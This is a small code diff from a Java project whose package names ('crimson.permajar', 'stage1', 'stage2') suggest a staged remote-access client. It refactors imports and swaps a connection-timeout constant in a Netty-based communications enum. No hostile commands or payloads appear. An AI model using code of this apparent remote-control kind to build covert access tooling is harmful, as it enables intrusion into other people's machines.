@@ -41,11 +41,11 @@ import subterranean.crimson.permajar.stage1.Stage1;
 import subterranean.crimson.permajar.stage2.Stage2;
 import subterranean.crimson.universal.BMN;
 import subterranean.crimson.universal.Cryptography;
-import subterranean.crimson.universal.EncType;
+import subterranean.crimson.universal.Environment;
 import subterranean.crimson.universal.Logger;
-import subterranean.crimson.universal.Variables;
+import subterranean.crimson.universal.ObjectTransfer;
 import subterranean.crimson.universal.containers.Message;
-import subterranean.crimson.universal.objects.ObjectTransfer;
+import subterranean.crimson.universal.enumerations.EncType;
 
 public enum Communications {
 
@@ -79,7 +79,7 @@ public enum Communications {
 		EventLoopGroup group = new NioEventLoopGroup();
 
 		Bootstrap b = new Bootstrap();
-		b.option(ChannelOption.CONNECT_TIMEOUT_MILLIS, Variables.reportTimeout);
+		b.option(ChannelOption.CONNECT_TIMEOUT_MILLIS, Environment.reportTimeout);
 		b.group(group).channel(NioSocketChannel.class).handler(new ChannelInitializer<SocketChannel>() {
 			@Override
 			public void initChannel(SocketChannel ch) {
